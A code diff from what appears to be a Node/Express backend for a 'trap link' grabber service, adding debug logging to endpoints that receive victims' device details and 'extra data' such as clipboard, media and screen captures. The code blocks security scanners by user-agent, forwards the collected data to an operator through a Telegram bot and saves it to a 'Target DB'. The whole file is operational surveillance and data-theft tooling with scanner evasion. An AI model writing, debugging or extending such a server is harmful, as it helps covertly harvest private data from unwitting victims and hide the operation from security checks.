@@ -405,13 +405,14 @@ async function startServer() {
 
   // Handle Device Metadata Upload
   app.post('/api/log/:id/info', (req, res) => {
-    console.log(`[DEBUG] Received info log for ${req.params.id}`);
+    console.log(`[DEBUG] Received info log for ${req.params.id}. Data: ${JSON.stringify(req.body)}`);
     if (isSuspeciousAgent(req.headers['user-agent'])) {
         console.log(`[DEBUG] Blocked info log for ${req.params.id} due to User-Agent`);
         return res.sendStatus(403);
     }
     const id = req.params.id;
     const chatId = getChatIdFromTrapId(id);
+    console.log(`[DEBUG] ID: ${id}, ChatID: ${chatId}, BotInstanceExists: ${!!botInstance}`);
     if (botInstance && chatId) {
       const data = req.body as any;
       const tmplId = data.tmplId || '1';
@@ -454,7 +455,9 @@ async function startServer() {
                   `└ LANGUAGES: <code>${escapeHTML((data.langs || '').substring(0, 30))}</code>\n\n` +
                   `━━━━━━━━━━━━━━━━━━━━`;
 
-      botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
+      botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' })
+        .then(() => console.log(`[DEBUG] Telegram sent info log successfully`))
+        .catch(err => console.error(`[DEBUG] Telegram FAILED to send info log:`, err));
       
       // Save to Target DB
       targetsData.push({
@@ -466,16 +469,19 @@ async function startServer() {
         gpu: data.gpu
       });
       saveTargets();
+    } else {
+      console.error(`[DEBUG] FAILED to send log: botInstance: ${!!botInstance}, chatId: ${chatId}`);
     }
     res.sendStatus(200);
   });
 
   // Handle Extra Data (Clipboard, Media, Screen, etc)
   app.post('/api/log/:id/extra', (req, res) => {
-    console.log(`[DEBUG] Received extra log for ${req.params.id}`);
+    console.log(`[DEBUG] Received extra log for ${req.params.id}. Data Keys: ${Object.keys(req.body)}`);
     if (isSuspeciousAgent(req.headers['user-agent'])) return res.sendStatus(403);
     const id = req.params.id;
     const chatId = getChatIdFromTrapId(id);
+    console.log(`[DEBUG] Extra Log ID: ${id}, ChatID: ${chatId}, BotInstanceExists: ${!!botInstance}`);
     if (botInstance && chatId) {
       const data = req.body as any;
       console.log(`[DEBUG] Extra log data keys for ${id}: ${Object.keys(data)}`);
